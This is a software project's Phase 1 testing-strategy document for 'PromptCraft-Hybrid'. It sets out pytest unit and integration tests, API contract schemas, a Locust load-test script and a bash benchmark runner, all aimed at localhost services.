---
title: "PromptCraft-Hybrid: Phase 1 Testing Strategy"
version: "3.0"
status: published
component: Architecture
tags: ['phase-1', 'testing', 'quality-assurance', 'performance', 'integration']
source: PromptCraft-Hybrid Project
purpose: Comprehensive testing strategy and quality assurance framework for Phase 1 MVP validation and deployment confidence.
---

# PromptCraft-Hybrid: Phase 1 Testing Strategy

## 1. Testing Philosophy & Approach

### 1.1. Quality Assurance Framework

PromptCraft-Hybrid Phase 1 testing follows a comprehensive multi-tier approach ensuring system reliability, performance, and user satisfaction:

**Testing Pyramid:**
- **Unit Tests (60%)**: Individual component validation with 80% coverage minimum
- **Integration Tests (30%)**: Multi-MCP workflows and API contract validation
- **End-to-End Tests (10%)**: Complete user journey validation

**Quality Gates:**
- All tests must pass before deployment
- Performance benchmarks must meet SLA requirements
- Security scans must show zero critical vulnerabilities
- Manual acceptance testing must achieve >85% satisfaction

### 1.2. Test Automation Strategy

```yaml
automation_framework:
  unit_testing:
    framework: "pytest + coverage"
    target_coverage: "80% minimum"
    excluded_patterns: ["tests/*", "migrations/*", "docs/*"]

  integration_testing:
    framework: "pytest + docker-compose"
    environment: "containerized test stack"
    data_management: "fixtures + factories"

  performance_testing:
    framework: "locust + k6"
    target_metrics: "p95 < 2s, p99 < 5s"
    load_patterns: "realistic user simulation"

  security_testing:
    static_analysis: "bandit + semgrep"
    dependency_scanning: "safety + pip-audit"
    container_scanning: "trivy"
```

## 2. Unit Testing Framework

### 2.1. Core Component Tests

```python
# tests/unit/test_knowledge_ingester.py
import pytest
import tempfile
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock
from datetime import datetime

from src.ingestion.simple_ingester import SimpleKnowledgeIngester, IngestionMetrics
from qdrant_client.models import PointStruct

class TestSimpleKnowledgeIngester:
    """Comprehensive unit tests for knowledge ingestion pipeline"""

    @pytest.fixture
    def mock_qdrant_client(self):
        """Mock Qdrant client for isolated testing"""
        mock_client = Mock()
        mock_client.get_collection.side_effect = Exception("Collection not found")
        mock_client.create_collection.return_value = None
        mock_client.upsert.return_value = Mock(operation_id="test-123", status="ok")
        return mock_client

    @pytest.fixture
    def mock_sentence_transformer(self):
        """Mock sentence transformer for predictable embeddings"""
        mock_encoder = Mock()
        mock_encoder.encode.return_value = [0.1] * 384  # Standard embedding size
        return mock_encoder

    @pytest.fixture
    def ingester(self, mock_qdrant_client, mock_sentence_transformer):
        """Create ingester with mocked dependencies"""
        with patch('src.ingestion.simple_ingester.QdrantClient', return_value=mock_qdrant_client), \
             patch('src.ingestion.simple_ingester.SentenceTransformer', return_value=mock_sentence_transformer):
            return SimpleKnowledgeIngester()

    @pytest.fixture
    def sample_markdown_file(self):
        """Create sample markdown file for testing"""
        content = """---
title: "Test Knowledge File"
version: "1.0"
status: "published"
agent_id: "test_agent"
tags: ['testing', 'unit_test']
purpose: "Test file for unit testing purposes."
---

# Test Knowledge File

## Introduction

This is a test file for unit testing.

### Key Concepts

Important concepts for testing:
- Unit testing principles
- Mock usage patterns
- Assertion strategies

### Implementation Details

Code examples and implementation guidance.
"""
        with tempfile.NamedTemporaryFile(mode='w', suffix='.md', delete=False) as f:
            f.write(content)
            return Path(f.name)

    def test_collection_initialization(self, ingester, mock_qdrant_client):
        """Test collection creation when it doesn't exist"""
        mock_qdrant_client.create_collection.assert_called_once()
        assert mock_qdrant_client.create_collection.call_args[1]['collection_name'] == 'promptcraft_knowledge'

    def test_frontmatter_parsing(self, ingester, sample_markdown_file):
        """Test YAML frontmatter parsing accuracy"""
        with open(sample_markdown_file, 'r') as f:
            content = f.read()

        frontmatter, markdown_content = ingester._parse_frontmatter(content)

        assert frontmatter['title'] == "Test Knowledge File"
        assert frontmatter['version'] == "1.0"
        assert frontmatter['agent_id'] == "test_agent"
        assert 'testing' in frontmatter['tags']
        assert "# Test Knowledge File" in markdown_content

    def test_frontmatter_validation(self, ingester, sample_markdown_file):
        """Test frontmatter validation rules"""
        # Valid frontmatter
        valid_frontmatter = {
            'title': 'Test',
            'version': '1.0',
            'status': 'published',
            'agent_id': 'test_agent'
        }
        assert ingester._validate_frontmatter(valid_frontmatter, sample_markdown_file)

        # Missing required field
        invalid_frontmatter = {'title': 'Test'}
        assert not ingester._validate_frontmatter(invalid_frontmatter, sample_markdown_file)

    def test_markdown_section_splitting(self, ingester):
        """Test markdown section splitting into atomic chunks"""
        content = """# Main Title

## Section 1

Content for section 1.

### Subsection 1.1

Detailed content for subsection 1.1.

### Subsection 1.2

Detailed content for subsection 1.2.

## Section 2

Content for section 2.
"""
        sections = ingester._split_markdown_sections(content)

        # Should split on H3 sections
        assert len(sections) >= 3
        assert any("Subsection 1.1" in section for section in sections)
        assert any("Subsection 1.2" in section for section in sections)

    def test_relevance_score_calculation(self, ingester):
        """Test relevance scoring algorithm"""
        content = "This is about security authentication and code development"
        frontmatter = {'tags': ['security', 'development']}

        scores = ingester._calculate_relevance_scores(content, frontmatter)

        assert scores['security'] > 0.0  # Should detect security content
        assert scores['development'] > 0.0  # Should detect development content
        assert scores['journey_1'] >= 0.0  # All scores should be non-negative
        assert all(0.0 <= score <= 1.0 for score in scores.values())  # Scores in valid range

    def test_quality_metrics_calculation(self, ingester):
        """Test content quality metric calculation"""
        # High quality content
        good_content = """### Clear Section Title

This section provides comprehensive explanation with:
- Clear structure
- Good examples
- Reasonable length lines that are not too long or too short

```python
# Example code
def example_function():
    return "example"
```

Additional explanatory text that provides context.
"""

        metrics = ingester._calculate_quality_metrics(good_content)

        assert 0.0 <= metrics['readability_score'] <= 1.0
        assert 0.0 <= metrics['completeness_score'] <= 1.0
        assert 0.0 <= metrics['currency_score'] <= 1.0
        assert metrics['completeness_score'] > 0.5  # Should score well for structure

    def test_file_processing_complete_workflow(self, ingester, sample_markdown_file):
        """Test complete file processing workflow"""
        chunks = ingester.process_markdown_file(sample_markdown_file)

        assert len(chunks) > 0
        assert all('id' in chunk for chunk in chunks)
        assert all('content' in chunk for chunk in chunks)
        assert all('metadata' in chunk for chunk in chunks)

        # Verify metadata structure
        first_chunk = chunks[0]
        metadata = first_chunk['metadata']
        assert metadata['source_file'] == str(sample_markdown_file)
        assert metadata['source_type'] == 'markdown'
        assert 'chunk_index' in metadata
        assert 'total_chunks' in metadata

    def test_directory_ingestion_metrics(self, ingester):
        """Test directory ingestion with metrics tracking"""
        with tempfile.TemporaryDirectory() as temp_dir:
            # Create test files
            test_files = []
            for i in range(3):
                content = f"""---
title: "Test File {i}"
version: "1.0"
status: "published"
tags: ['test']
purpose: "Test file {i} for metrics testing."
---

# Test File {i}

### Content Section {i}

Test content for file {i}.
"""
                file_path = Path(temp_dir) / f"test_{i}.md"
                with open(file_path, 'w') as f:
                    f.write(content)
                test_files.append(file_path)

            # Process directory
            metrics = ingester.ingest_directory(Path(temp_dir))

            assert metrics.files_processed == 3
            assert metrics.chunks_created > 0
            assert metrics.processing_time_ms > 0
            assert metrics.errors == 0

    def test_error_handling(self, ingester):
        """Test error handling for invalid files"""
        # Test with non-existent file
        chunks = ingester.process_markdown_file(Path("/nonexistent/file.md"))
        assert chunks == []
        assert ingester.metrics.errors > 0

    @pytest.mark.performance
    def test_performance_benchmarks(self, ingester):
        """Test performance meets requirements"""
        # Create larger test content
        large_content = """---
title: "Performance Test File"
version: "1.0"
status: "published"
tags: ['performance', 'testing']
purpose: "Large file for performance testing."
---

# Performance Test File

""" + "\n".join([f"### Section {i}\n\nContent for section {i} with sufficient text to test processing performance." for i in range(100)])

        with tempfile.NamedTemporaryFile(mode='w', suffix='.md', delete=False) as f:
            f.write(large_content)
            test_file = Path(f.name)

        import time
        start_time = time.time()
        chunks = ingester.process_markdown_file(test_file)
        processing_time = time.time() - start_time

        # Performance requirements
        assert processing_time < 5.0  # Should process large file in under 5 seconds
        assert len(chunks) > 50  # Should create many chunks

        # Cleanup
        test_file.unlink()

class TestIngestionMetrics:
    """Test ingestion metrics tracking"""

    def test_metrics_initialization(self):
        """Test metrics object initialization"""
        metrics = IngestionMetrics()
        assert metrics.files_processed == 0
        assert metrics.chunks_created == 0
        assert metrics.chunks_stored == 0
        assert metrics.errors == 0
        assert metrics.processing_time_ms == 0

    def test_metrics_updates(self):
        """Test metrics tracking during processing"""
        metrics = IngestionMetrics()

        # Simulate processing
        metrics.files_processed += 1
        metrics.chunks_created += 5
        metrics.chunks_stored += 5
        metrics.processing_time_ms = 1500

        assert metrics.files_processed == 1
        assert metrics.chunks_created == 5
        assert metrics.chunks_stored == 5
        assert metrics.processing_time_ms == 1500
```

### 2.2. Gradio UI Component Tests

```python
# tests/unit/test_gradio_ui.py
import pytest
from unittest.mock import Mock, patch, MagicMock
import requests

from src.ui.promptcraft_app import PromptCraftUI

class TestPromptCraftUI:
    """Unit tests for Gradio UI components"""

    @pytest.fixture
    def ui_instance(self):
        """Create UI instance for testing"""
        return PromptCraftUI(zen_endpoint="http://test-zen:3000")

    @pytest.fixture
    def mock_requests(self):
        """Mock requests library for API testing"""
        with patch('src.ui.promptcraft_app.requests') as mock:
            yield mock

    def test_ui_initialization(self, ui_instance):
        """Test UI initialization"""
        assert ui_instance.zen_endpoint == "http://test-zen:3000"
        assert ui_instance.session_history == []
        assert ui_instance.performance_metrics == []

    def test_enhance_query_success(self, ui_instance, mock_requests):
        """Test successful query enhancement"""
        # Mock successful API response
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {
            'enhanced_prompt': 'Enhanced prompt content',
            'reasoning_trace': [{'step': 1, 'mcp_server': 'test'}],
            'sources': [{'type': 'test', 'source': 'test.md'}],
            'performance_metrics': {'total_time_ms': 1500}
        }
        mock_requests.post.return_value = mock_response

        result = ui_instance.enhance_query(
            "Test query", "basic", "hybrid"
        )

        enhanced_prompt, reasoning, sources, metrics = result

        assert enhanced_prompt == 'Enhanced prompt content'
        assert len(reasoning) == 1
        assert len(sources) == 1
        assert 'total_time_ms' in metrics
        assert len(ui_instance.session_history) == 1

    def test_enhance_query_empty_input(self, ui_instance, mock_requests):
        """Test query enhancement with empty input"""
        result = ui_instance.enhance_query("", "basic", "hybrid")
        enhanced_prompt, reasoning, sources, metrics = result

        assert "Please enter a query" in enhanced_prompt
        assert reasoning == {}
        assert sources == []

        # Should not make API call
        mock_requests.post.assert_not_called()

    def test_enhance_query_api_error(self, ui_instance, mock_requests):
        """Test query enhancement with API error"""
        # Mock API error
        mock_response = Mock()
        mock_response.status_code = 500
        mock_response.text = "Internal Server Error"
        mock_requests.post.return_value = mock_response

        result = ui_instance.enhance_query(
            "Test query", "basic", "hybrid"
        )

        enhanced_prompt, reasoning, sources, metrics = result

        assert "API Error 500" in enhanced_prompt
        assert 'error' in metrics

    def test_enhance_query_timeout(self, ui_instance, mock_requests):
        """Test query enhancement with timeout"""
        # Mock timeout
        mock_requests.post.side_effect = requests.exceptions.Timeout()

        result = ui_instance.enhance_query(
            "Test query", "basic", "hybrid"
        )

        enhanced_prompt, reasoning, sources, metrics = result

        assert "timed out" in enhanced_prompt
        assert metrics.get('error') == 'timeout'

    def test_ide_integration_success(self, ui_instance, mock_requests):
        """Test successful IDE integration"""
        # Mock successful API response
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {
            'enhanced_prompt': 'IDE enhanced prompt',
            'context_data': [{'type': 'code', 'source': 'test.py'}],
            'suggestions': [{'type': 'improvement', 'description': 'Add tests'}]
        }
        mock_requests.post.return_value = mock_response

        result = ui_instance.test_ide_integration(
            "/test/project", "src/test.py", "print('hello')",
            "Add error handling", 10, 20, True, True, True
        )

        enhanced_prompt, context_data, suggestions = result

        assert enhanced_prompt == 'IDE enhanced prompt'
        assert len(context_data) == 1
        assert len(suggestions) == 1

    def test_system_status_retrieval(self, ui_instance, mock_requests):
        """Test system status retrieval"""
        # Mock health endpoint
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {
            'overall_status': 'healthy',
            'mcps': {'serena': {'status': 'healthy'}}
        }
        mock_requests.get.return_value = mock_response

        # Add some session history
        ui_instance.session_history = [
            {'timestamp': '2024-01-01', 'query': 'test', 'journey': '1', 'response_time': '1000ms', 'success': True}
        ]

        mcp_status, perf_metrics, query_history, system_logs = ui_instance.get_system_status()

        assert mcp_status['overall_status'] == 'healthy'
        assert perf_metrics['total_queries'] == 1
        assert len(query_history) == 1
        assert 'System status check' in system_logs

    def test_knowledge_base_stats(self, ui_instance):
        """Test knowledge base statistics"""
        stats = ui_instance.get_knowledge_base_stats()

        assert 'total_documents' in stats
        assert 'total_chunks' in stats
        assert 'embedding_model' in stats
        assert stats['embedding_model'] == 'all-MiniLM-L6-v2'
```

### 2.3. MCP Orchestrator Tests

```python
# tests/unit/test_mcp_orchestrator.py
import pytest
import asyncio
from unittest.mock import Mock, patch, AsyncMock
import aiohttp

# Note: This assumes the orchestrator is converted to Python
# For Node.js version, equivalent tests would use Jest/Mocha

class TestMCPOrchestrator:
    """Unit tests for MCP orchestration logic"""

    @pytest.fixture
    def orchestrator(self):
        """Create orchestrator instance for testing"""
        with patch('aiohttp.ClientSession'):
            # Mock implementation would go here
            pass

    @pytest.mark.asyncio
    async def test_query_analysis(self, orchestrator):
        """Test query analysis for MCP requirements"""
        # Test code-related query
        code_query = "Refactor this function to improve performance"
        context = {"file_path": "src/test.py", "project_root": "/project"}

        required_mcps = await orchestrator.analyze_query_requirements(code_query, context)

        assert 'serena' in required_mcps
        assert 'filesystem' in required_mcps
        assert 'qdrantMemory' in required_mcps

    @pytest.mark.asyncio
    async def test_parallel_execution_success(self, orchestrator):
        """Test successful parallel MCP execution"""
        # Mock successful MCP responses
        with patch.object(orchestrator, 'call_mcp') as mock_call:
            mock_call.side_effect = [
                {'data': {'result': 'serena_result'}, 'executionTime': 100},
                {'data': {'result': 'github_result'}, 'executionTime': 200}
            ]

            results = await orchestrator.execute_parallel_with_fallback(
                ['serena', 'github'], "test query", {}
            )

            assert len(results) == 2
            assert all(r['success'] for r in results)

    @pytest.mark.asyncio
    async def test_circuit_breaker_functionality(self, orchestrator):
        """Test circuit breaker prevents calls to failing services"""
        # Simulate failures to trigger circuit breaker
        for _ in range(5):
            orchestrator.record_failure('test_mcp')

        assert not orchestrator.is_circuit_breaker_closed('test_mcp')

        # Reset should close circuit breaker
        orchestrator.reset_circuit_breaker('test_mcp')
        assert orchestrator.is_circuit_breaker_closed('test_mcp')
```

## 3. Integration Testing

### 3.1. Multi-MCP Workflow Tests

```python
# tests/integration/test_mcp_integration.py
import pytest
import docker
import requests
import time
from pathlib import Path
import tempfile

@pytest.fixture(scope="session")
def docker_services():
    """Start Docker Compose stack for integration testing"""
    client = docker.from_env()

    # Use docker-compose for test environment
    import subprocess
    subprocess.run(['docker-compose', '-f', 'docker-compose.test.yml', 'up', '-d'], check=True)

    # Wait for services to be ready
    time.sleep(30)

    # Health check
    max_retries = 30
    for i in range(max_retries):
        try:
            response = requests.get('http://localhost:3000/health', timeout=5)
            if response.status_code == 200:
                break
        except requests.exceptions.RequestException:
            pass
        time.sleep(2)
    else:
        pytest.fail("Services failed to start within timeout")

    yield

    # Cleanup
    subprocess.run(['docker-compose', '-f', 'docker-compose.test.yml', 'down'], check=True)

class TestMCPIntegration:
    """Integration tests for multi-MCP workflows"""

    def test_zen_mcp_health_check(self, docker_services):
        """Test Zen MCP server health endpoint"""
        response = requests.get('http://localhost:3000/health')
        assert response.status_code == 200

        health_data = response.json()
        assert health_data['overall_status'] in ['healthy', 'degraded']
        assert 'mcps' in health_data

        # Check individual MCP statuses
        expected_mcps = ['serena', 'filesystem', 'github', 'sequential-thinking', 'qdrant-memory']
        for mcp in expected_mcps:
            assert mcp in health_data['mcps']

    def test_journey1_complete_workflow(self, docker_services):
        """Test complete Journey 1 workflow"""
        query_payload = {
            "query": "Create a secure authentication system for a web application",
            "journey": "1",
            "preferences": {
                "reasoning_depth": "enhanced",
                "search_tier": "hybrid",
                "response_format": "full"
            }
        }

        start_time = time.time()
        response = requests.post(
            'http://localhost:3000/api/v1/query',
            json=query_payload,
            timeout=30
        )
        response_time = time.time() - start_time

        assert response.status_code == 200
        data = response.json()

        # Validate response structure
        assert 'enhanced_prompt' in data
        assert 'reasoning_trace' in data
        assert 'sources' in data
        assert 'performance_metrics' in data

        # Validate content quality
        assert len(data['enhanced_prompt']) > 100
        assert 'C.R.E.A.T.E.' in data['enhanced_prompt'] or 'authentication' in data['enhanced_prompt']

        # Validate performance
        assert response_time < 10.0  # Should complete within 10 seconds
        assert data['performance_metrics']['total_time_ms'] < 10000

    def test_journey3_ide_integration(self, docker_services):
        """Test Journey 3 IDE integration workflow"""
        ide_payload = {
            "query": "Add error handling to this API endpoint",
            "context": {
                "file_path": "src/api/users.py",
                "project_root": "/workspace/test-project",
                "file_content": "def get_user(user_id):\n    return database.get_user(user_id)"
            },
            "options": {
                "include_reasoning": True,
                "search_code": True,
                "analyze_project": True
            }
        }

        response = requests.post(
            'http://localhost:3000/api/v1/claude-code',
            json=ide_payload,
            timeout=15
        )

        assert response.status_code == 200
        data = response.json()

        # Validate IDE-specific response
        assert 'enhanced_prompt' in data
        assert 'context_data' in data
        assert 'suggestions' in data

        # Should provide relevant code suggestions
        assert len(data['context_data']) > 0
        assert any('error' in str(suggestion).lower() for suggestion in data['suggestions'])

    def test_knowledge_ingestion_workflow(self, docker_services):
        """Test knowledge ingestion through webhook"""
        # Create test knowledge file
        test_knowledge = """---
title: "Test Integration Knowledge"
version: "1.0"
status: "published"
agent_id: "test_agent"
tags: ['integration', 'testing']
purpose: "Test knowledge file for integration testing."
---

# Test Integration Knowledge

## Testing Framework

### Unit Testing

Unit tests validate individual component functionality.

### Integration Testing

Integration tests validate multi-component workflows.
"""

        # Simulate GitHub webhook payload
        webhook_payload = {
            "ref": "refs/heads/main",
            "commits": [
                {
                    "modified": ["knowledge/test_agent/integration-test.md"],
                    "added": [],
                    "removed": []
                }
            ]
        }

        # Send webhook
        response = requests.post(
            'http://localhost:5000/webhook/knowledge-update',
            json=webhook_payload,
            headers={'X-Hub-Signature-256': 'sha256=test-signature'},
            timeout=30
        )

        assert response.status_code == 200
        data = response.json()
        assert data['status'] == 'success'

        # Verify knowledge is searchable
        time.sleep(5)  # Allow ingestion to complete

        search_payload = {
            "query": "integration testing framework",
            "journey": "1",
            "preferences": {"search_tier": "local"}
        }

        search_response = requests.post(
            'http://localhost:3000/api/v1/query',
            json=search_payload,
            timeout=10
        )

        assert search_response.status_code == 200
        search_data = search_response.json()

        # Should find the ingested knowledge
        sources = search_data.get('sources', [])
        assert any('integration' in source.get('content', '').lower() for source in sources)

    def test_qdrant_vector_search_performance(self, docker_services):
        """Test Qdrant vector search performance"""
        # Direct Qdrant search test
        search_payload = {
            "query": "authentication security best practices",
            "limit": 5
        }

        start_time = time.time()
        response = requests.post(
            'http://localhost:3000/api/v1/search',
            json=search_payload,
            timeout=5
        )
        search_time = time.time() - start_time

        assert response.status_code == 200
        data = response.json()

        # Performance requirements
        assert search_time < 1.0  # Sub-second search
        assert 'results' in data
        assert len(data['results']) > 0

        # Relevance validation
        for result in data['results']:
            assert 'relevance_score' in result
            assert result['relevance_score'] > 0.0

    def test_concurrent_requests(self, docker_services):
        """Test system handles concurrent requests"""
        import concurrent.futures
        import threading

        def make_request():
            payload = {
                "query": f"Test concurrent request {threading.current_thread().ident}",
                "journey": "1"
            }
            return requests.post(
                'http://localhost:3000/api/v1/query',
                json=payload,
                timeout=30
            )

        # Execute 10 concurrent requests
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(make_request) for _ in range(10)]
            results = [f.result() for f in concurrent.futures.as_completed(futures)]

        # Validate results
        successful_requests = [r for r in results if r.status_code == 200]
        assert len(successful_requests) >= 8  # Allow for some failures under load

        # Check response times remain reasonable
        for response in successful_requests:
            data = response.json()
            if 'performance_metrics' in data:
                assert data['performance_metrics']['total_time_ms'] < 15000  # 15s max under load

    def test_error_recovery_and_fallback(self, docker_services):
        """Test system error recovery and fallback mechanisms"""
        # Test with invalid MCP endpoint to trigger fallback
        invalid_payload = {
            "query": "Test fallback behavior",
            "journey": "1",
            "preferences": {"mcp_preference": "nonexistent_mcp"}
        }

        response = requests.post(
            'http://localhost:3000/api/v1/query',
            json=invalid_payload,
            timeout=15
        )

        # Should still return successful response with available MCPs
        assert response.status_code == 200
        data = response.json()
        assert 'enhanced_prompt' in data

        # Check reasoning trace shows fallback behavior
        reasoning_trace = data.get('reasoning_trace', [])
        assert len(reasoning_trace) > 0  # Should have attempted some MCPs
```

### 3.2. API Contract Validation

```python
# tests/integration/test_api_contracts.py
import pytest
import requests
import jsonschema
from pathlib import Path

class TestAPIContracts:
    """Test API contracts match specifications"""

    @pytest.fixture
    def api_schemas(self):
        """Load API schemas for validation"""
        return {
            'query_request': {
                "type": "object",
                "required": ["query"],
                "properties": {
                    "query": {"type": "string", "minLength": 1},
                    "journey": {"type": "string", "enum": ["1", "3", "light"]},
                    "context": {"type": "object"},
                    "preferences": {"type": "object"}
                }
            },
            'query_response': {
                "type": "object",
                "required": ["enhanced_prompt", "reasoning_trace", "sources", "performance_metrics"],
                "properties": {
                    "query_id": {"type": "string"},
                    "enhanced_prompt": {"type": "string", "minLength": 10},
                    "reasoning_trace": {"type": "array"},
                    "sources": {"type": "array"},
                    "performance_metrics": {
                        "type": "object",
                        "required": ["total_time_ms"],
                        "properties": {
                            "total_time_ms": {"type": "number", "minimum": 0}
                        }
                    }
                }
            }
        }

    def test_query_endpoint_contract(self, docker_services, api_schemas):
        """Test /api/v1/query endpoint contract compliance"""
        valid_request = {
            "query": "Create a REST API for user management",
            "journey": "1",
            "context": {
                "project_path": "/workspace/test",
                "repository_url": "https://github.com/test/repo"
            },
            "preferences": {
                "reasoning_depth": "basic",
                "search_tier": "hybrid",
                "response_format": "full"
            }
        }

        # Validate request schema
        jsonschema.validate(valid_request, api_schemas['query_request'])

        response = requests.post(
            'http://localhost:3000/api/v1/query',
            json=valid_request,
            timeout=15
        )

        assert response.status_code == 200

        # Validate response schema
        response_data = response.json()
        jsonschema.validate(response_data, api_schemas['query_response'])

        # Validate business logic
        assert len(response_data['enhanced_prompt']) > 50
        assert response_data['performance_metrics']['total_time_ms'] > 0

    def test_claude_code_endpoint_contract(self, docker_services):
        """Test /api/v1/claude-code endpoint contract"""
        valid_request = {
            "query": "Optimize database queries in this module",
            "context": {
                "file_path": "src/models/user.py",
                "project_root": "/workspace/myapp",
                "file_content": "class User:\n    def get_by_email(self, email):\n        return db.query('SELECT * FROM users WHERE email = ?', email)"
            },
            "options": {
                "include_reasoning": True,
                "search_code": True,
                "analyze_project": True
            }
        }

        response = requests.post(
            'http://localhost:3000/api/v1/claude-code',
            json=valid_request,
            timeout=15
        )

        assert response.status_code == 200
        data = response.json()

        # Validate required fields
        required_fields = ['enhanced_prompt', 'context_data', 'reasoning_trace', 'suggestions']
        for field in required_fields:
            assert field in data

        # Validate context data structure
        context_data = data['context_data']
        assert isinstance(context_data, list)

        if context_data:
            sample_context = context_data[0]
            assert 'type' in sample_context
            assert 'source' in sample_context
            assert 'relevance' in sample_context

    def test_error_response_format(self, docker_services):
        """Test error response format consistency"""
        # Invalid request (missing required field)
        invalid_request = {"invalid": "request"}

        response = requests.post(
            'http://localhost:3000/api/v1/query',
            json=invalid_request,
            timeout=10
        )

        assert response.status_code == 400
        error_data = response.json()

        # Validate error response structure
        assert 'error' in error_data
        assert isinstance(error_data['error'], str)
```

## 4. Performance Testing

### 4.1. Load Testing with Locust

```python
# tests/performance/locustfile.py
from locust import HttpUser, task, between
import random
import json

class PromptCraftUser(HttpUser):
    """Simulated user behavior for load testing"""

    wait_time = between(1, 5)  # Wait 1-5 seconds between requests
    host = "http://localhost:3000"

    def on_start(self):
        """Setup for each user session"""
        self.session_id = random.randint(1000, 9999)
        self.query_count = 0

    @task(3)
    def journey1_basic_query(self):
        """Simulate Journey 1 basic query (70% of traffic)"""
        queries = [
            "Create a login form with validation",
            "Design a REST API for product management",
            "Implement user authentication with JWT",
            "Build a responsive dashboard layout",
            "Create unit tests for service layer"
        ]

        payload = {
            "query": random.choice(queries),
            "journey": "1",
            "preferences": {
                "reasoning_depth": random.choice(["basic", "enhanced"]),
                "search_tier": "hybrid"
            }
        }

        with self.client.post("/api/v1/query", json=payload, catch_response=True) as response:
            if response.status_code == 200:
                data = response.json()
                response_time = data.get('performance_metrics', {}).get('total_time_ms', 0)

                if response_time > 5000:  # 5 second SLA
                    response.failure(f"Response time {response_time}ms exceeds SLA")
                else:
                    response.success()
            else:
                response.failure(f"Request failed with status {response.status_code}")

    @task(2)
    def journey1_complex_query(self):
        """Simulate Journey 1 complex query (20% of traffic)"""
        complex_queries = [
            "Design a microservices architecture for an e-commerce platform with authentication, payment processing, inventory management, and order fulfillment",
            "Create a comprehensive testing strategy for a React application including unit tests, integration tests, and end-to-end tests",
            "Implement a scalable data pipeline for real-time analytics with Apache Kafka, Spark, and Elasticsearch"
        ]

        payload = {
            "query": random.choice(complex_queries),
            "journey": "1",
            "preferences": {
                "reasoning_depth": "deep",
                "search_tier": "hybrid",
                "response_format": "full"
            }
        }

        with self.client.post("/api/v1/query", json=payload, catch_response=True) as response:
            if response.status_code == 200:
                data = response.json()
                response_time = data.get('performance_metrics', {}).get('total_time_ms', 0)

                if response_time > 15000:  # 15 second SLA for complex queries
                    response.failure(f"Complex query response time {response_time}ms exceeds SLA")
                else:
                    response.success()
            else:
                response.failure(f"Request failed with status {response.status_code}")

    @task(1)
    def journey3_ide_integration(self):
        """Simulate Journey 3 IDE integration (10% of traffic)"""
        code_queries = [
            "Add error handling to this function",
            "Refactor this component for better performance",
            "Write unit tests for this module",
            "Add TypeScript types to this JavaScript code"
        ]

        file_examples = [
            ("src/components/Button.jsx", "export function Button({ onClick, children }) {\n  return <button onClick={onClick}>{children}</button>\n}"),
            ("src/services/api.js", "export function fetchUser(id) {\n  return fetch(`/api/users/${id}`).then(r => r.json())\n}"),
            ("src/utils/validation.py", "def validate_email(email):\n  return '@' in email")
        ]

        file_path, file_content = random.choice(file_examples)

        payload = {
            "query": random.choice(code_queries),
            "context": {
                "file_path": file_path,
                "project_root": "/workspace/test-project",
                "file_content": file_content
            },
            "options": {
                "include_reasoning": True,
                "search_code": True,
                "analyze_project": True
            }
        }

        with self.client.post("/api/v1/claude-code", json=payload, catch_response=True) as response:
            if response.status_code == 200:
                response.success()
            else:
                response.failure(f"IDE integration failed with status {response.status_code}")

    @task(1)
    def health_check(self):
        """Monitor system health during load"""
        with self.client.get("/health", catch_response=True) as response:
            if response.status_code == 200:
                data = response.json()
                if data.get('overall_status') != 'healthy':
                    response.failure(f"System health degraded: {data.get('overall_status')}")
                else:
                    response.success()
            else:
                response.failure(f"Health check failed with status {response.status_code}")

class StressTestUser(HttpUser):
    """High-intensity user for stress testing"""

    wait_time = between(0.1, 0.5)  # Very short wait times
    host = "http://localhost:3000"

    @task
    def rapid_fire_requests(self):
        """Send rapid requests to test system limits"""
        payload = {
            "query": f"Stress test query {random.randint(1, 1000)}",
            "journey": "1"
        }

        self.client.post("/api/v1/query", json=payload)
```

### 4.2. Performance Benchmark Scripts

```bash
#!/bin/bash
# tests/performance/run_performance_tests.sh

echo "Starting PromptCraft-Hybrid Performance Test Suite"
echo "================================================="

# Ensure test environment is running
docker-compose -f docker-compose.test.yml up -d
sleep 30

# Wait for services to be ready
echo "Waiting for services to be ready..."
max_attempts=60
attempt=0

while [ $attempt -lt $max_attempts ]; do
    if curl -s http://localhost:3000/health > /dev/null; then
        echo "Services are ready!"
        break
    fi
    echo "Attempt $((attempt + 1))/$max_attempts - waiting for services..."
    sleep 5
    attempt=$((attempt + 1))
done

if [ $attempt -eq $max_attempts ]; then
    echo "ERROR: Services failed to start within timeout"
    exit 1
fi

# Run baseline performance test
echo "Running baseline performance test..."
locust -f tests/performance/locustfile.py --headless \
    --users 10 --spawn-rate 2 --run-time 300s \
    --html reports/baseline_performance.html \
    --csv reports/baseline_performance

# Run load test
echo "Running load test..."
locust -f tests/performance/locustfile.py --headless \
    --users 50 --spawn-rate 5 --run-time 600s \
    --html reports/load_test.html \
    --csv reports/load_test

# Run stress test
echo "Running stress test..."
locust -f tests/performance/locustfile.py:StressTestUser --headless \
    --users 100 --spawn-rate 10 --run-time 300s \
    --html reports/stress_test.html \
    --csv reports/stress_test

# Analyze results
python tests/performance/analyze_results.py

echo "Performance testing complete. Check reports/ directory for results."

# Cleanup
docker-compose -f docker-compose.test.yml down
```

```python
# tests/performance/analyze_results.py
import pandas as pd
import json
from pathlib import Path

def analyze_performance_results():
    """Analyze performance test results and generate report"""

    reports_dir = Path("reports")
    results = {}

    # Analyze baseline test
    if (reports_dir / "baseline_performance_stats.csv").exists():
        baseline_df = pd.read_csv(reports_dir / "baseline_performance_stats.csv")
        results['baseline'] = {
            'avg_response_time': baseline_df['Average Response Time'].mean(),
            'max_response_time': baseline_df['Max Response Time'].max(),
            'failure_rate': baseline_df['Failure Count'].sum() / baseline_df['Request Count'].sum(),
            'requests_per_second': baseline_df['Requests/s'].mean()
        }

    # Analyze load test
    if (reports_dir / "load_test_stats.csv").exists():
        load_df = pd.read_csv(reports_dir / "load_test_stats.csv")
        results['load_test'] = {
            'avg_response_time': load_df['Average Response Time'].mean(),
            'max_response_time': load_df['Max Response Time'].max(),
            'failure_rate': load_df['Failure Count'].sum() / load_df['Request Count'].sum(),
            'requests_per_second': load_df['Requests/s'].mean()
        }

    # Generate performance report
    report = {
        'test_summary': results,
        'sla_compliance': check_sla_compliance(results),
        'recommendations': generate_recommendations(results)
    }

    # Save report
    with open(reports_dir / "performance_analysis.json", 'w') as f:
        json.dump(report, f, indent=2)

    print("Performance Analysis Report")
    print("==========================")
    print(json.dumps(report, indent=2))

    return report

